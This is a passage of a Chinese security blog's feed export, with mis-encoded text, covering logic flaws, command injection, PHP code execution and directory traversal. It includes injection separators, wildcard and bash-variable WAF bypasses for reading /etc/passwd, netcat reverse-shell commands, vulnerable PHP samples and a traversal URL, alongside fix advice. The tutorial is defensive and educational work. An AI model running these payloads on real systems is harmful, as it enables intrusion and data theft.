title="å››ã€æ”¯ä»˜ä¸Žè¶Šæƒ"></a>å››ã€æ”¯ä»˜ä¸Žè¶Šæƒ</h3><p>è¿™é‡Œæ”¾ä¸Šæ€ç»´å¯¼å›¾ã€‚</p><p><img src="https://image.3001.net/images/20190215/1550200482_5c662ea2cbd66.png!small" alt="2$1(WJDQ4JDVMZDNN}TB%JD.png">è¿™é‡Œä¹‹æ‰€ä»¥æ²¡æœ‰æŒ‰å…ˆå‰ç«¯å†åŽç«¯çš„é¡ºåºæ¥å†™ï¼Œæ˜¯å› ä¸ºå‡ ä¹Žæ¯ä¸ªç½‘ç«™çš„æ”¯ä»˜å’Œè¶Šæƒé€»è¾‘éƒ½ä¸å¤ªä¸€æ ·ï¼Œä½¿ç”¨å…ˆå‰ç«¯å†åŽç«¯è¿™æ ·çš„æ¡†æž¶çš„è¯å°±é™åˆ¶äº†æ€è·¯ã€‚</p><p>åœ¨æ”¯ä»˜å’Œè¶Šæƒè¿™é‡Œæˆ‘è®¤ä¸ºï¼Œåªè¦æœ‰å‚æ•°ï¼Œéƒ½å¯ä»¥ä¿®æ”¹ï¼Œéƒ½æœ‰å¯èƒ½å‡ºçŽ°é—®é¢˜ã€‚</p><p>é€šå¸¸æˆ‘ä¼šä½¿ç”¨ä¸¤ä¸ªè´¦å·æ¥å¯¹æ¯”æµ‹è¯•ï¼Œè¿™æ ·å¯ä»¥æ›´å¿«å‘çŽ°å¯ç–‘å‚æ•°ã€‚</p><p>è§£é‡Šï¼ˆæœ‰ä»»ä½•é—®é¢˜éƒ½å¯ä»¥ç•™è¨€ï¼Œæˆ‘ä¼šå°½é‡è§£ç­”ï¼Œé—®é¢˜å¾ˆå¤šçš„è¯æˆ‘ä¼šåœ¨è¿‡æ®µæ—¶é—´çš„è¿›é˜¶ç¯‡é‡Œç»Ÿä¸€å½’çº³æ•´ç†ï¼‰ï¼š</p><p>æ”¯ä»˜æŽ¥å£æŒ‡çš„æ˜¯ç½‘ç«™æ”¯ä»˜ä¸€èˆ¬ä¼šæœ‰åƒå¾®ä¿¡æ”¯ä»˜ã€æ”¯ä»˜å®æ”¯ä»˜è¿™ç§ï¼Œä¸€èˆ¬ç½‘ç«™ä¼šåœ¨æ”¯ä»˜çš„å‘é€åŒ…é‡Œç”¨æŸä¸ªå‚æ•°æ ‡è¯†ã€‚</p><p>ç™»å½•æ—¶æŸ¥çœ‹å¹¶æµ‹è¯•ç”¨æˆ·ä¿¡æ¯è¿”å›žæŽ¥å£æŒ‡çš„æ˜¯ï¼Œåœ¨ç™»å½•çš„æ—¶å€™ï¼Œæœ‰çš„ç½‘ç«™æœ‰ä¸ªè¿”å›žåŒ…æ˜¯ä¸€ä¸ªjsonæ•°æ®åŒ…ï¼Œè¯¥åŒ…å†…åŒ…å«äº†ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ï¼Œæ­¤æ—¶å°±å¯ä»¥å°è¯•ä¿®æ”¹å‘é€åŒ…çš„ç”¨æˆ·å‚æ•°ï¼Œè¯´ä¸å®šå°±èƒ½èŽ·å–å…¶ä»–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ã€‚ </p><h2 id="æ€ç»´å¯¼å›¾æ€»è§ˆ"><a href="#æ€ç»´å¯¼å›¾æ€»è§ˆ" class="headerlink" title="æ€ç»´å¯¼å›¾æ€»è§ˆ"></a>æ€ç»´å¯¼å›¾æ€»è§ˆ</h2><p><img src="/2021/05/24/web-luo-ji-lou-dong/9c4ad34c41464ed8972ca0abe7121b7.png" alt="9c4ad34c41464ed8972ca0abe7121b7"></p><p>å‚è€ƒï¼š<a href="https://www.freebuf.com/articles/web/195837.html">https://www.freebuf.com/articles/web/195837.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ¼æ´žåˆ©ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web:å‘½ä»¤æ‰§è¡Œæ¼æ´ž</title>
      <link href="2021/05/23/web-ming-ling-zhi-xing-lou-dong/"/>
      <url>2021/05/23/web-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h3 id="å‘½ä»¤æ‰§è¡Œæ¼æ´žåŽŸç†"><a href="#å‘½ä»¤æ‰§è¡Œæ¼æ´žåŽŸç†" class="headerlink" title="å‘½ä»¤æ‰§è¡Œæ¼æ´žåŽŸç†"></a>å‘½ä»¤æ‰§è¡Œæ¼æ´žåŽŸç†</h3><p>å½“åº”ç”¨éœ€è¦è°ƒç”¨ä¸€äº›å¤–éƒ¨ç¨‹åºåŽ»å¤„ç†å†…å®¹çš„æƒ…å†µä¸‹ï¼Œå°±ä¼šç”¨åˆ°ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ã€‚å¦‚PHPä¸­çš„systemï¼Œexecï¼Œshell_execç­‰ï¼Œå½“ç”¨æˆ·å¯ä»¥æŽ§åˆ¶å‘½ä»¤æ‰§è¡Œå‡½æ•°ä¸­çš„å‚æ•°æ—¶ï¼Œå°†å¯æ³¨å…¥æ¶æ„ç³»ç»Ÿå‘½ä»¤åˆ°æ­£å¸¸å‘½ä»¤ä¸­ï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œæ”»å‡»ã€‚</p><h3 id="æ¼æ´žæˆå› "><a href="#æ¼æ´žæˆå› " class="headerlink" title="æ¼æ´žæˆå› "></a>æ¼æ´žæˆå› </h3><p>è„šæœ¬è¯­è¨€ä¼˜ç‚¹æ˜¯ç®€æ´ï¼Œæ–¹ä¾¿ï¼Œä½†ä¹Ÿä¼´éšç€ä¸€äº›é—®é¢˜ï¼Œå¦‚é€Ÿåº¦æ…¢ï¼Œæ— æ³•è§£é™¤ç³»ç»Ÿåº•å±‚ï¼Œå¦‚æžœæˆ‘ä»¬å¼€å‘çš„åº”ç”¨éœ€è¦ä¸€äº›é™¤åŽ»webçš„ç‰¹æ®ŠåŠŸèƒ½æ—¶ï¼Œå°±éœ€è¦è°ƒç”¨ä¸€äº›å¤–éƒ¨ç¨‹åºã€‚</p><p>PHPå¯è°ƒç”¨å¤–éƒ¨ç¨‹åºçš„å¸¸è§å‡½æ•°ï¼šsystem,exec,shell_exec,passthru,popen,proc_popen</p><h3 id="å‘½ä»¤æ‰§è¡Œæ¼æ´žåˆ©ç”¨æ¡ä»¶"><a href="#å‘½ä»¤æ‰§è¡Œæ¼æ´žåˆ©ç”¨æ¡ä»¶" class="headerlink" title="å‘½ä»¤æ‰§è¡Œæ¼æ´žåˆ©ç”¨æ¡ä»¶"></a>å‘½ä»¤æ‰§è¡Œæ¼æ´žåˆ©ç”¨æ¡ä»¶</h3><ol><li>åº”ç”¨è°ƒç”¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°</li><li>å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºç³»ç»Ÿå‘½ä»¤çš„å‚æ•°æ‹¼æŽ¥åˆ°äº†å‘½ä»¤è¡Œä¸­</li><li>æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œè¿‡æ»¤æˆ–è¿‡æ»¤ä¸ä¸¥</li></ol><h3 id="æˆå› åˆ†ç±»"><a href="#æˆå› åˆ†ç±»" class="headerlink" title="æˆå› åˆ†ç±»"></a>æˆå› åˆ†ç±»</h3><p>1.ä»£ç å±‚è¿‡æ»¤ä¸ä¸¥æ ¼ï¼š</p><p>å•†ä¸šåº”ç”¨éœ€è¦æ‰§è¡Œå‘½ä»¤ï¼Œå•†ä¸šåº”ç”¨çš„ä¸€äº›æ ¸å¿ƒä»£ç å¯èƒ½å°ä½åœ¨äºŒè¿›åˆ¶æ–‡ä»¶å½“ä¸­ï¼Œåœ¨webåº”ç”¨ä¸­é€šè¿‡systemå‡½æ•°è°ƒç”¨ã€‚</p><p>system(â€œ/bin/program â€“arg $argâ€)</p><p>2.è°ƒç”¨ç¬¬ä¸‰æ–¹ç»„ä»¶å­˜åœ¨çš„ä»£ç æ‰§è¡Œæ¼æ´žï¼š</p><p>å¦‚wordpressï¼Œå¯ä»¥é€‰æ‹©imagemagickè¿™ä¸ªå¸¸ç”¨çš„å›¾ç‰‡å¤„ç†ç»„ä»¶ï¼Œå¤„ç†ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡æ—¶é€ æˆå‘½ä»¤æ‰§è¡Œ</p><p>JAVAä¸­ struts2/elasticsearch groovyç­‰</p><h3 id="æ¼æ´žå±å®³"><a href="#æ¼æ´žå±å®³" class="headerlink" title="æ¼æ´žå±å®³"></a>æ¼æ´žå±å®³</h3><ol><li>ç»§æ‰¿WebæœåŠ¡ç¨‹åºçš„æƒé™åŽ»æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æˆ–è¯»å†™æ–‡ä»¶</li><li>åå¼¹shell</li><li>æŽ§åˆ¶æ•´ä¸ªç½‘ç«™ç”šè‡³æœåŠ¡å™¨</li><li>è¿›ä¸€æ­¥å†…ç½‘æ¸—é€</li><li>ç­‰ç­‰</li></ol><p><img src="https://img-blog.csdn.net/20161022154115710?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p><p><img src="https://img-blog.csdn.net/20161022154121113?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p><p><img src="https://img-blog.csdn.net/20161022154126460?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p><p><img src="https://img-blog.csdn.net/20161022154130613?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p><p>æ¼æ´žçš„æ¸—é€æ–¹æ³•ï¼š</p><p>æœ€å¯é çš„æ–¹æ³•ä½¿ç”¨æ—¶é—´å»¶è¿ŸæŽ¨æ–­ï¼Œç±»ä¼¼ä¸Žç›²æ³¨çš„æ–¹æ³•ã€‚</p><p>1.åœ¨URLä¸Šcmd=xxxxxxåŽæ‹¼æŽ¥||ping -i 30 127.0.0.1   (&amp;)åº”ç”¨ç¨‹åºI ping -i 30 127.0.0.1 I</p><p>å¯èƒ½è¿‡æ»¤æŽ‰æŸäº›å‘½ä»¤åˆ†éš”ç¬¦ å¯ä»¥æ¢åšä¸‹é¢çš„å‘½ä»¤ï¼š</p><p>I ping -n 30 127.0.0.1 I<br>&amp; ping -i 30 127.0.0.1 &amp;<br>&amp; ping -n 30 127.0.0.1 &amp;<br>;ping 127.0.0.1 ;<br>%0a ping -i 30 127.0.0.1 %0a â€˜ ping 127.0.0.1 â€˜</p><p>æ³¨æ„windowså’Œlinuxçš„è¯­æ³•ä¸åŒï¼š</p><p>windowsæ”¯æŒï¼š&amp;&amp;,&amp;,||ï¼ˆå“ªæ¡åä»¤ä¸ºçœŸæ‰§è¡Œé‚£æ¡ï¼‰</p><p>linuxæ”¯æŒï¼š&amp;&amp;,&amp;,||ï¼ˆæ‰§è¡Œä¸ºçœŸï¼‰ | ï¼ˆæ‰§è¡ŒåŽé¢çš„è¯­å¥ï¼‰</p><p>2.å‘ç”Ÿå»¶è¿Ÿï¼Œè¯´æ˜Žç¨‹åºå¯èƒ½æ˜“äºŽå—åˆ°å‘½ä»¤æ³¨å…¥çš„æ”»å‡»ï¼Œå¯¹å°è¯•å‡ æ¬¡ï¼Œç¡®å®šä¸æ˜¯å› ä¸ºç½‘ç»œå»¶è¿Ÿé€ æˆçš„ï¼Œæ›´æ”¹-i -n æ•°å€¼ï¼Œç¡®å®šæ—¶é—´å»¶è¿Ÿæ˜¯å¦éšç€æäº¤çš„å€¼å‘ç”Ÿå˜åŒ–ã€‚</p><p>3.ä½¿ç”¨å‘çŽ°çš„æ‰€æœ‰å¯æˆåŠŸå®žæ–½æ³¨å…¥çš„å­—ç¬¦ä¸²ï¼Œå°è¯•æ³¨å…¥dirã€ls</p><p>4ä¸èƒ½åœ¨æµè§ˆå™¨ç›´æŽ¥çœ‹åˆ°å›žæ˜¾ï¼Œå¯å°†å‘½ä»¤é‡å®šå‘åˆ°å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ä¸­å¹¶æŸ¥çœ‹ã€‚æˆ–è€…ç”¨TFTPä¸Šä¼ å·¥å…·åˆ°æœåŠ¡å™¨ï¼Œç”¨telnetå’Œnetcatå»ºç«‹åå‘shellï¼Œç”¨mailé€šè¿‡SMTPå‘é€ç»“æžœç»™è‡ªå·±çš„è®¡ç®—æœºã€‚</p><p>5.æŸ¥çœ‹è‡ªå·±çš„æƒé™ï¼Œå¯ä»¥æå‡è‡ªå·±æƒé™ï¼Œè®¿é—®æ•æ„Ÿæ•°æ®æˆ–æŽ§åˆ¶æœåŠ¡å™¨ã€‚</p><h5 id="å‘½ä»¤æ‹¼æŽ¥ç¬¦"><a href="#å‘½ä»¤æ‹¼æŽ¥ç¬¦" class="headerlink" title="å‘½ä»¤æ‹¼æŽ¥ç¬¦"></a>å‘½ä»¤æ‹¼æŽ¥ç¬¦</h5><p>|ã€||ã€&amp;ã€&amp;&amp;çš„åŒºåˆ«ï¼š<br>&amp;ï¼šæ— è®ºå·¦è¾¹æ˜¯falseè¿˜æ˜¯trueï¼Œå³è¾¹éƒ½æ‰§è¡Œ<br>&amp;&amp;ï¼šå…·æœ‰çŸ­è·¯æ•ˆæžœï¼Œå·¦è¾¹æ˜¯falseï¼Œå³è¾¹ä¸æ‰§è¡Œã€‚<br>|:æ— è®ºå·¦è¾¹æ˜¯falseè¿˜æ˜¯trueï¼Œå³è¾¹éƒ½ä¼šæ‰§è¡Œ<br>||ï¼šå…·æœ‰çŸ­è·¯æ•ˆæžœï¼Œå·¦è¾¹æ˜¯trueï¼Œå³è¾¹ä¸æ‰§è¡Œã€‚</p><h5 id="ä»£ç æ‰§è¡Œï¼š"><a href="#ä»£ç æ‰§è¡Œï¼š" class="headerlink" title="ä»£ç æ‰§è¡Œï¼š"></a>ä»£ç æ‰§è¡Œï¼š</h5><p>åˆ©ç”¨ç³»ç»Ÿå‡½æ•°å®žçŽ°å‘½ä»¤æ‰§è¡Œï¼Œåœ¨phpä¸‹ï¼Œå…è®¸å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°æœ‰ï¼š<br>evalï¼ˆï¼‰ã€assertï¼ˆï¼‰ã€preg_replaceï¼ˆï¼‰ã€call_user_funcï¼ˆï¼‰<br>å¦‚æžœé¡µé¢ä¸­å­˜åœ¨è¿™äº›å‡½æ•°å¹¶ä¸”å¯¹äºŽç”¨æˆ·çš„è¾“å…¥æ²¡æœ‰åšä¸¥æ ¼çš„è¿‡æ»¤ï¼Œé‚£ä¹ˆå°±å¯èƒ½é€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ž</p><h5 id="å…¶ä»–å‡½æ•°"><a href="#å…¶ä»–å‡½æ•°" class="headerlink" title="å…¶ä»–å‡½æ•°"></a>å…¶ä»–å‡½æ•°</h5><p>ob_startï¼ˆï¼‰ã€unserializeï¼ˆï¼‰ã€creat_functionï¼ˆï¼‰<br>ã€usortï¼ˆï¼‰ã€uasortï¼ˆï¼‰ã€uksortï¼ˆï¼‰ã€<br>array_filterï¼ˆï¼‰ã€<br>array_reduceï¼ˆï¼‰ã€<br>array_mapï¼ˆï¼‰â€¦â€¦</p><p><strong>ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæ¼æ´ž</strong><br>systemï¼ˆï¼‰<br>execï¼ˆï¼‰<br>shell_execï¼ˆï¼‰<br>passthruï¼ˆï¼‰<br>pcntl_execï¼ˆï¼‰<br>popenï¼ˆï¼‰<br>proc_openï¼ˆï¼‰<br>åå¼•å·<br>â€¦â€¦</p><p><strong>å‘½ä»¤æ‰§è¡ŒWAFç»•è¿‡æŠ€å·§</strong><br><strong>æŠ€å·§ä¸€ï¼šé€šé…ç¬¦</strong><br>ls-l<br>ä½¿ç”¨é€šé…ç¬¦<br>/?in/?s-l</p><p>/???/??t /??c/p???w?<br>æœ‰æ—¶å€™WAFä¸å…è®¸ä½¿ç”¨å¤ªå¤šçš„ï¼Ÿå·<br>/?in/cat/?tc/p?sswd</p><p>NCåå¼¹shell:<br>nc -e /bin/bash 127.0.0.1 3737<br>ä¸ºäº†é¿å…ç¬¦å·ï¼Œå¯ä»¥å°†IPåœ°å€è½¬æ¢æˆæ•´åž‹ã€‚<br>127.0.0.1-&gt;2130706433</p><p>ä½¿ç”¨é€šé…ç¬¦<br>root@kali:~#/??n/?c -e/??n/b??h 2130706433 3737</p><p><strong>æŠ€å·§äºŒï¼šè¿žæŽ¥ç¬¦</strong></p><p><img src="https://img2018.cnblogs.com/blog/1646039/201909/1646039-20190904124248741-71863935.png" alt="img"></p><p><strong>æŠ€å·§ä¸‰ï¼šæœªåˆå§‹åŒ–çš„bashå˜é‡</strong><br>åœ¨bashçŽ¯å¢ƒä¸­å…è®¸æˆ‘ä»¬ä½¿ç”¨æœªåˆå§‹åŒ–çš„bashå˜é‡ï¼Œå¦‚ä½•<br>$a ,$b,$c<br>æˆ‘ä»¬äº‹å…ˆå¹¶æ²¡æœ‰å®šä¹‰å®ƒä»¬ï¼Œè¾“å‡ºçœ‹çœ‹:<br>root@kali:<del># echo $a<br>root@kali:</del># echo $b<br>root@kali:<del># echo $c<br>root@kali:</del>#<br>æœªåˆå§‹åŒ–çš„å˜é‡å€¼éƒ½æ˜¯null</p><p>è¯»å–/etc/passwd:<br>cat$a /etc$a/passwd$a</p><p>æµ‹è¯•WAF<br>æµ‹è¯•ä»£ç ï¼š<br><!--?phpecho "OK";system('dig'.$_GET['host']);?--></p><p><a href="http://www.baidu.com;$s/bin$s/which$s">www.baidu.com;$s/bin$s/which$s</a> nc$s<br>åå¼¹shell:<br>/bin$s/nc$s -e/bin$s/bash$s 2130706433 3737</p><p><strong>æ¼æ´žä¿®å¤ï¼š</strong></p><ol><li>å°½é‡å°‘ç”¨æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æˆ–è€…ç›´æŽ¥ç¦ç”¨</li><li>å‚æ•°å€¼å°½é‡ä½¿ç”¨å¼•å·åŒ…æ‹¬</li><li>åœ¨ä½¿ç”¨åŠ¨æ€å‡½æ•°ä¹‹å‰ï¼Œç¡®ä¿ä½¿ç”¨çš„å‡½æ•°æ˜¯æŒ‡å®šçš„å‡½æ•°ä¹‹ä¸€</li><li>åœ¨è¿›å…¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°/æ–¹æ³•ä¹‹å‰ï¼Œå¯¹å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå¯¹æ•æ„Ÿå­—ç¬¦è¿›è¡Œè½¬ä¹‰</li><li>å¯¹PHPè¯­è¨€æ¥è¯´ï¼Œä¸èƒ½å®Œå…¨æŽ§åˆ¶çš„å±é™©å‡½æ•°æœ€å¥½ä¸è¦ä½¿ç”¨</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> æ¼æ´žåˆ©ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web:ä»£ç æ‰§è¡Œæ¼æ´ž</title>
      <link href="2021/05/22/web-dai-ma-zhi-xing-lou-dong/"/>
      <url>2021/05/22/web-dai-ma-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€è¿°ä»£ç æ‰§è¡Œæ¼æ´žï¼š"><a href="#ç®€è¿°ä»£ç æ‰§è¡Œæ¼æ´žï¼š" class="headerlink" title="ç®€è¿°ä»£ç æ‰§è¡Œæ¼æ´žï¼š"></a>ç®€è¿°ä»£ç æ‰§è¡Œæ¼æ´žï¼š</h2><p>PHPä»£ç æ‰§è¡Œæ¼æ´žå¯ä»¥å°†ä»£ç æ³¨å…¥åˆ°åº”ç”¨ä¸­ï¼Œæœ€ç»ˆåˆ°webserveråŽ»æ‰§è¡Œã€‚è¯¥æ¼æ´žä¸»è¦å­˜åœ¨äºŽeval()ã€assert()ã€preg_replace()ã€call_user_func()ã€array_map()ä»¥åŠåŠ¨æ€å‡½æ•°ä¸­ã€‚</p><h4 id="1-evalå’Œassertå‡½æ•°"><a href="#1-evalå’Œassertå‡½æ•°" class="headerlink" title="1.evalå’Œassertå‡½æ•°"></a>1.evalå’Œassertå‡½æ•°</h4><p> eval()å‡½æ•°æ˜¯å°†è¾“å…¥çš„å­—ç¬¦ä¸²å½“åšPHPä»£ç æ‰§è¡Œï¼Œassert()ä¼šæ£€æŸ¥æŒ‡å®šçš„ assertion å¹¶åœ¨ç»“æžœä¸º FALSE æ—¶é‡‡å–é€‚å½“çš„è¡ŒåŠ¨ã€‚</p><h5 id="ç¤ºä¾‹ä»£ç 1ï¼š"><a href="#ç¤ºä¾‹ä»£ç 1ï¼š" class="headerlink" title="ç¤ºä¾‹ä»£ç 1ï¼š"></a>ç¤ºä¾‹ä»£ç 1ï¼š</h5><pre><code>&lt;?php$a='wjw';$b='xy';eval('$a=$b;');/assert('$a=$b;');var_dump($a);?&gt;</code></pre><p><strong>ç¤ºä¾‹ä»£ç 2ï¼š</strong></p><pre><code>&lt;?phpeval('phpinfo();');/assert('phpinfo();');?&gt;</code></pre><h4 id="2-preg-replaceå‡½æ•°"><a href="#2-preg-replaceå‡½æ•°" class="headerlink" title="2.preg_replaceå‡½æ•°"></a>2.preg_replaceå‡½æ•°</h4><p>æ­¤å‡½æ•°çš„ä½œç”¨æ˜¯å¯¹ä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ­£åˆ™å¤„ç†ï¼ˆå…·ä½“å‡½æ•°åŠŸèƒ½è‡ªè¡Œæœç´¢ï¼‰</p><pre><code>mixed preg_replace ( mixed $ pattern , mixed $ replacement , mixed $ subject [, int $ limit = -1 [, int &amp;$ count ]] )</code></pre><p>preg_replaceå‡½æ•°çš„ä»£ç æ‰§è¡Œéœ€è¦å­˜åœ¨/eå‚æ•°</p><h5 id="ç¤ºä¾‹ä»£ç ï¼š"><a href="#ç¤ºä¾‹ä»£ç ï¼š" class="headerlink" title="ç¤ºä¾‹ä»£ç ï¼š"></a>ç¤ºä¾‹ä»£ç ï¼š</h5><pre><code>&lt;?phppreg_replace("/ \[(.*)\]/e",'\\1',$_GET['str']);?&gt;</code></pre><p>å°†æ˜¾ç¤ºPHPç‰ˆæœ¬ä¿¡æ¯</p><h3 id="3-è°ƒç”¨å‡½æ•°è¿‡æ»¤ä¸ä¸¥"><a href="#3-è°ƒç”¨å‡½æ•°è¿‡æ»¤ä¸ä¸¥" class="headerlink" title="3.è°ƒç”¨å‡½æ•°è¿‡æ»¤ä¸ä¸¥"></a>3.è°ƒç”¨å‡½æ•°è¿‡æ»¤ä¸ä¸¥</h3><p>call_user_func()å’Œarray_map()ç­‰å‡½æ•°å…·æœ‰è°ƒç”¨å…¶ä»–å‡½æ•°çš„åŠŸèƒ½ï¼Œç”¨call_user_func()å‡½æ•°æ¥ä¸¾ä¾‹ï¼Œå‡½æ•°çš„ä½œç”¨æ˜¯è°ƒç”¨ç¬¬ä¸€ä¸ªå‚æ•°(å‡½æ•°)ï¼Œå°†ç¬¬äºŒä¸ªå‚æ•°ä½œä¸ºè¦è°ƒç”¨çš„å‡½æ•°çš„å‚æ•°</p><pre><code>call_user_func ( callable $callback [, mixed $parameter [, mixed $â€¦ ]] )</code></pre><p> <strong>æµ‹è¯•ä»£ç </strong></p><pre><code>&lt;?php$b="phpinfo()";call_user_func($_GET['a'],$b);?&gt;</code></pre><h2 id="4-åŠ¨æ€å‡½æ•°æ‰§è¡Œ"><a href="#4-åŠ¨æ€å‡½æ•°æ‰§è¡Œ" class="headerlink" title="4.åŠ¨æ€å‡½æ•°æ‰§è¡Œ"></a>4.åŠ¨æ€å‡½æ•°æ‰§è¡Œ</h2><p>åŠ¨æ€å‡½æ•°çš„å†™æ³•ä¸ºâ€å˜é‡(å‚æ•°)â€</p><h5 id="ç¤ºä¾‹ä»£ç "><a href="#ç¤ºä¾‹ä»£ç " class="headerlink" title="ç¤ºä¾‹ä»£ç :"></a>ç¤ºä¾‹ä»£ç :</h5><pre><code>&lt;?php$_GET['a']($_GET['b']);?&gt;123</code></pre><p>GETè¯·æ±‚å‚æ•°aï¼Œä½œä¸ºå‡½æ•°ï¼Œè€Œbä½œä¸ºå‡½æ•°çš„å‚æ•°ï¼Œæ‰§è¡Œç»“æžœä¹Ÿæ˜¯phpçš„ç‰ˆæœ¬ä¿¡æ¯</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ¼æ´žåˆ©ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web:ç›®å½•éåŽ†æ¼æ´ž</title>
      <link href="2021/05/21/web-mu-lu-bian-li-lou-dong/"/>
      <url>2021/05/21/web-mu-lu-bian-li-lou-dong/</url>
      
        <content type="html"><![CDATA[<h3 id="ä»€ä¹ˆæ˜¯ç›®å½•éåŽ†ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯ç›®å½•éåŽ†ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ç›®å½•éåŽ†ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ç›®å½•éåŽ†ï¼Ÿ</h3><p>ç›®å½•éåŽ†ï¼ˆç›®å½•ç©¿è¶Šï¼‰æ˜¯ä¸€ä¸ªWebå®‰å…¨æ¼æ´žï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´žè¯»å–è¿è¡Œåº”ç”¨ç¨‹åºçš„æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚ è¿™å¯èƒ½åŒ…æ‹¬åº”ç”¨ç¨‹åºä»£ç å’Œæ•°æ®ï¼ŒåŽç«¯ç³»ç»Ÿçš„ç™»å½•ä¿¡æ¯ä»¥åŠæ•æ„Ÿçš„æ“ä½œç³»ç»Ÿæ–‡ä»¶ã€‚</p><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿåœ¨æœåŠ¡å™¨ä¸Šå†™å…¥ä»»æ„æ–‡ä»¶ï¼Œï¼ˆå¦‚ï¼ŒFFFTPæ˜¯ä¸€æ¬¾å°åž‹çš„FTPå®¢æˆ·ç«¯è½¯ä»¶ã€‚FFFTPå®¢æˆ·ç«¯æ²¡æœ‰æ­£ç¡®åœ°éªŒè¯FTPæœåŠ¡å™¨æ‰€è¿”å›žçš„LISTå‘½ä»¤å“åº”ä¸­åŒ…å«æœ‰ç›®å½•éåŽ†åºåˆ—ï¼ˆæ–œçº¿ï¼‰çš„æ–‡ä»¶åï¼Œå¦‚æžœç”¨æˆ·å—éª—ä»Žæ¶æ„çš„FTPæœåŠ¡å™¨ä¸‹è½½çš„ç›®å½•åŒ…å«æœ‰å¸¦æœ‰æ¶æ„æ–‡ä»¶åçš„æ–‡ä»¶çš„è¯ï¼Œå°±å¯èƒ½å¯¼è‡´å‘ç”¨æˆ·ç³»ç»Ÿçš„ä»»æ„ä½ç½®å†™å…¥æ–‡ä»¶ï¼‰ä»Žè€Œå…è®¸ä»–ä»¬ä¿®æ”¹åº”ç”¨ç¨‹åºæ•°æ®æˆ–è¡Œä¸ºï¼Œå¹¶æœ€ç»ˆå®Œå…¨æŽ§åˆ¶æœåŠ¡å™¨ã€‚</p><h3 id="æ¼æ´žåŽŸç†"><a href="#æ¼æ´žåŽŸç†" class="headerlink" title="æ¼æ´žåŽŸç†"></a>æ¼æ´žåŽŸç†</h3><p>è‹¥webè¦æ˜¾ç¤ºä¸€ä¸ªå•†å“çš„å›¾åƒï¼Œæœ‰æ—¶å€™å¼€å‘è€…ä¼šç”¨é€šè¿‡HTMLåŠ è½½ï¼Œå¦‚ï¼š</p><pre><code>&lt;img src="/loadImage?filename=214.png"&gt;</code></pre><p>ä½¿ç”¨filenameå‚æ•°åŠ è½½å›¾åƒæ–‡ä»¶ï¼Œå›¾ç‰‡æ–‡ä»¶ä½ç½®å¯èƒ½æ˜ å°„åœ¨ /var/www/images/ ä¸Šï¼Œæ‰€ä»¥çœŸå®žçš„è·¯å¾„æ˜¯ /var/www/images/214.png </p><p>è¿™å°±å¯¼è‡´äº†æ”»å‡»è€…å¯ä»¥è¯»å–æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ï¼š</p><pre><code>https://www.*****.com/loadImage?filename=../../../etc/passwd</code></pre><p>filenameçš„å‚æ•°å€¼ä¸ŽçœŸå®žè·¯å¾„ç»„åˆèµ·æ¥å°±æ˜¯ï¼š</p><pre><code>/var/www/images/../../../etc/passwd</code></pre><p>å…¶ç­‰ä»·äºŽï¼š</p><pre><code>/etc/passwd</code></pre><pre><code>åœ¨Unixæ“ä½œç³»ç»Ÿä¸Šï¼Œ../ æ˜¯ä¸€ä¸ªæ ‡å‡†çš„è¿”å›žä¸Šä¸€çº§è·¯å¾„çš„è¯­æ³•ï¼›åœ¨Windowsæ“ä½œç³»ç»Ÿä¸Šï¼Œ ../ å’Œ ..\ éƒ½æ˜¯è¿”å›žä¸Šä¸€çº§çš„è¯­å¥ã€‚</code></pre><p>(1) åŠ å¯†å‚æ•°ä¼ é€’çš„æ•°æ®ï¼›</p><p>åœ¨Webåº”ç”¨ç¨‹åºå¯¹æ–‡ä»¶åè¿›è¡ŒåŠ å¯†ä¹‹åŽå†æäº¤ï¼Œæ¯”å¦‚ï¼šâ€œdownfile.jsp?filename= ZmFuLnBkZg-  